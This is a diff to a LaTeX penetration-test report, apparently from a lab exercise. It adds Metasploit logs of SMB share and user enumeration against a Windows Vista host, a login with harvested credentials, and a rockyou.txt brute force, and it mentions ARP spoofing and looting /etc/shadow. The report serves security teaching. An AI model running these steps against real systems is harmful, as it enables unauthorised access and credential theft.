@@ -100,11 +100,11 @@ This host, as mentioned above, was continuously sending TELNET packages over the
 
 \includegraphics[scale=0.5]{arpspoof2.png}
 
-% DSNIFF HERE
+\includegraphics[scale=0.5]{telnet.png}
 
 This yielded good results, and possible usernames and passwords were identified. After compromising this box with \textit{sudo} privileges, the root password could easily be changed and the Ubuntu machine could be considered completely compromised. 
 
-% LOGGING IN
+\includegraphics[scale=0.5]{pwnd.png}
 
 After logging in, Group 3 proceeded to loot the \textit{/etc/shadow} file to gather additional information about the network. Here, we found:
 
@@ -301,11 +301,8 @@ jane@192.168.248.130's password:
 Last login: Wed Oct 29 18:13:59 2014
 Hi - congratulations on the login!
 Well played!
-
 Can you evolve and get more useful access here?
-
  - L
-
 $
 \end{lstlisting}
 
@@ -529,6 +526,218 @@ had only one \textbf{High} rated vulnerability returned from the OpenVAS scan, a
 
 Had a user been logged in and performed any web requests, perhaps \textit{ARP poisoning} or \textit{DNS poisoning} had been possible to achieve this. Several exploits seem to exist for Vista SP1, but this Vista is Service Pack 0.
 
-The testing team 
+The testing team decided to still follow up on the SMB trail as this was the only window to get in through, it seemed.
 
-\subsubsection{Password Cracking}
+\subparagraph{Enumerating shares}
+
+
+\begin{lstlisting}[language=bash,caption={Enumerating shares}]
+msf > use auxiliary/scanner/smb/smb_enumshares
+msf auxiliary(smb_enumshares) > show options
+
+Module options (auxiliary/scanner/smb/smb_enumshares):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   LogSpider        3                no        0 = disabled, 1 = CSV, 2 = table (txt), 3 = one liner (txt) (accepted: 0, 1, 2, 3)
+   MaxDepth         999              yes       Max number of subdirectories to spider
+   RHOSTS                            yes       The target address range or CIDR identifier
+   SMBDomain        WORKGROUP        no        The Windows domain to use for authentication
+   SMBPass                           no        The password for the specified username
+   SMBUser                           no        The username to authenticate as
+   ShowFiles        false            yes       Show detailed information when spidering
+   SpiderProfiles   true             no        Spider only user profiles when share = C$
+   SpiderShares     false            no        Spider shares recursively
+   THREADS          1                yes       The number of concurrent threads
+   USE_SRVSVC_ONLY  false            yes       List shares only with SRVSVC
+
+msf auxiliary(smb_enumshares) > set RHOSTS 192.168.248.131
+RHOSTS => 192.168.248.131
+msf auxiliary(smb_enumshares) > set THREADS 20
+THREADS => 20
+msf auxiliary(smb_enumshares) > run
+
+[-] 192.168.248.131:139 - Login Failed: The SMB server did not reply to our request
+[*] 192.168.248.131:445 - Windows Vista Business (Build 6000) (Unknown)
+[*] 192.168.248.131:445 - No shares collected
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(smb_enumshares) > set SMBDomain __MSBROWSE__
+SMBDomain => __MSBROWSE__
+msf auxiliary(smb_enumshares) > run
+
+[-] 192.168.248.131:139 - Login Failed: The SMB server did not reply to our request
+[*] 192.168.248.131:445 - Windows Vista Business (Build 6000) (Unknown)
+[*] 192.168.248.131:445 - No shares collected
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+\end{lstlisting}
+
+\subparagraph{Using previously collected credentials}
+Since Group 3 had some information harvested from the compromised machine, the next logical step was to apply those. Jane had already proved somewhat successful on the OpenBSD machine, so for the Windows machine, User's credentials (password: summer) was used.
+
+\begin{lstlisting}[language=bash,caption={Logging in}]
+msf > use auxiliary/scanner/smb/smb_login
+msf auxiliary(smb_login) > show options
+
+Module options (auxiliary/scanner/smb/smb_login):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   BLANK_PASSWORDS   false            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false            no        Add all users in the current database to the list
+   PASS_FILE                          no        File containing passwords, one per line
+   PRESERVE_DOMAINS  true             no        Respect a username that contains a domain name.
+   RECORD_GUEST      false            no        Record guest-privileged random logins to the database
+   RHOSTS                             yes       The target address range or CIDR identifier
+   RPORT             445              yes       Set the SMB service port
+   SMBDomain                          no        SMB Domain
+   SMBPass                            no        SMB Password
+   SMBUser                            no        SMB Username
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
+   THREADS           1                yes       The number of concurrent threads
+   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false            no        Try the username as the password for all users
+   USER_FILE                          no        File containing usernames, one per line
+   VERBOSE           true             yes       Whether to print output for all attempts
+
+msf auxiliary(smb_login) > set SMBPass summer
+SMBPass => summer
+msf auxiliary(smb_login) > set SMBUser User
+SMBUser => User
+msf auxiliary(smb_login) > set RHOSTS 192.168.248.131
+RHOSTS => 192.168.248.131
+msf auxiliary(smb_login) > run
+
+[*] 192.168.248.131:445 SMB - Starting SMB login bruteforce
+[+] 192.168.248.131:445 SMB - Success: 'WORKSTATION\User:summer'
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(smb_login) > 
+\end{lstlisting}
+
+Logging in worked! Next step taken was to find out what other users were on the system, using \textit{smb\_enumusers} in Metasploit:
+
+\begin{lstlisting}[language=bash,caption={Enumerating users}]
+msf > use auxiliary/scanner/smb/smb_enumusers
+msf auxiliary(smb_enumusers) > show options
+
+Module options (auxiliary/scanner/smb/smb_enumusers):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   RHOSTS                      yes       The target address range or CIDR identifier
+   SMBDomain  WORKGROUP        no        The Windows domain to use for authentication
+   SMBPass                     no        The password for the specified username
+   SMBUser                     no        The username to authenticate as
+   THREADS    1                yes       The number of concurrent threads
+
+msf auxiliary(smb_enumusers) > set RHOSTS 192.168.248.131
+RHOSTS => 192.168.248.131
+msf auxiliary(smb_enumusers) > set SMBUser User
+SMBUser => User
+msf auxiliary(smb_enumusers) > set SMBPass summer
+SMBPass => summer
+msf auxiliary(smb_enumusers) > run
+
+[*] 192.168.248.131 LH-0XZPOTYEAFVA [ Admin, Administrator, Guest, User ] ( LockoutTries=0 PasswordMin=0 )
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+\end{lstlisting}
+
+Looks like \textit{Jane} isn't here. But \textit{Admin}, \textit{Administrator}, \textit{Guest} and our \textit{User} is. Well, \textit{Administrator} exists by default in Windows, but Admin does not. Since logging in proved successful, perhaps now enumerating shares will be successful as well: Therefore, the next step was to see what shares were available with \textit{smb\_enumshares}
+
+\begin{lstlisting}[language=bash,caption={Enumerating shares}]
+msf > use auxiliary/scanner/smb/smb_enumshares
+msf auxiliary(smb_enumshares) > show options
+
+Module options (auxiliary/scanner/smb/smb_enumshares):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   LogSpider        3                no        0 = disabled, 1 = CSV, 2 = table (txt), 3 = one liner (txt) (accepted: 0, 1, 2, 3)
+   MaxDepth         999              yes       Max number of subdirectories to spider
+   RHOSTS                            yes       The target address range or CIDR identifier
+   SMBDomain        WORKGROUP        no        The Windows domain to use for authentication
+   SMBPass                           no        The password for the specified username
+   SMBUser                           no        The username to authenticate as
+   ShowFiles        false            yes       Show detailed information when spidering
+   SpiderProfiles   true             no        Spider only user profiles when share = C$
+   SpiderShares     false            no        Spider shares recursively
+   THREADS          1                yes       The number of concurrent threads
+   USE_SRVSVC_ONLY  false            yes       List shares only with SRVSVC
+
+msf auxiliary(smb_enumshares) > set SMBUser User
+SMBUser => User
+msf auxiliary(smb_enumshares) > set SMBPass summer
+SMBPass => summer
+msf auxiliary(smb_enumshares) > set RHOSTS 192.168.248.131
+RHOSTS => 192.168.248.131
+msf auxiliary(smb_enumshares) > run
+
+[-] 192.168.248.131:139 - Login Failed: The SMB server did not reply to our request
+[*] 192.168.248.131:445 - Windows Vista Business (Build 6000) (Unknown)
+[+] 192.168.248.131:445 - ADMIN$ - (DISK) 
+[+] 192.168.248.131:445 - C$ - (DISK) 
+[+] 192.168.248.131:445 - IPC$ - (IPC) 
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+\end{lstlisting}
+
+Thus far, ADMIN\$, C\$ and IPC\$ are the available shares -- but after running an nmap script (omitted here), it seems only IPC\$ is open to any access whatsoever.
+
+After attempting to log in to SAMBA multiple times, it seems there's no read/write access to any of these shares. We need higher privileges. As a desperate attempt, Group 3 resorted to bruteforcing these accounts for the SMB login.
+
+First, saving the usernames to a userlist file, and then using the wordlist used to crack the passwords earlier. This will be the list of all users to be tried. Now, the same wordlist will be set as PASS\_FILE and this user list as USER\_FILE for the smb\_login auxiliary scanner module in metasploit. Hopefully, with some luck, access could have been gained:
+
+\begin{lstlisting}[language=bash,caption={}]
+root@battlestation:~# printf "Admin\nAdministrator\nGuest" > userlist
+msf > use auxiliary/scanner/smb/smb_login
+msf auxiliary(smb_login) > show options
+
+Module options (auxiliary/scanner/smb/smb_login):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   BLANK_PASSWORDS   false            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false            no        Add all users in the current database to the list
+   PASS_FILE                          no        File containing passwords, one per line
+   PRESERVE_DOMAINS  true             no        Respect a username that contains a domain name.
+   RECORD_GUEST      false            no        Record guest-privileged random logins to the database
+   RHOSTS                             yes       The target address range or CIDR identifier
+   RPORT             445              yes       Set the SMB service port
+   SMBDomain                          no        SMB Domain
+   SMBPass                            no        SMB Password
+   SMBUser                            no        SMB Username
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
+   THREADS           1                yes       The number of concurrent threads
+   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false            no        Try the username as the password for all users
+   USER_FILE                          no        File containing usernames, one per line
+   VERBOSE           true             yes       Whether to print output for all attempts
+
+msf auxiliary(smb_login) > set PASS_FILE /root/rockyou.txt
+PASS_FILE => /root/rockyou.txt
+msf auxiliary(smb_login) > set USER_FILE /root/userlist
+USER_FILE => /root/userlist
+msf auxiliary(smb_login) > set RHOSTS 192.168.248.131
+RHOSTS => 192.168.248.131
+msf auxiliary(smb_login) > set STOP_ON_SUCCESS true
+STOP_ON_SUCCESS => true
+msf auxiliary(smb_login) > run
+
+[*] 192.168.248.131:445 SMB - Starting SMB login bruteforce
+
+...
+
+[-] 192.168.248.131:445 SMB - Failed: 'WORKSTATION\Admin:082807', Login Failed: The server responded with error: STATUS_LOGON_FAILURE (Command=115 Wordcount=0)
+...
+\end{lstlisting}
+
+That final line was repeated many, many, many times. Other attempts were manually logging in with \textit{rpcclient} and \textit{smbclient}, but listing directories let alone writing was not possible anywhere, on any share.
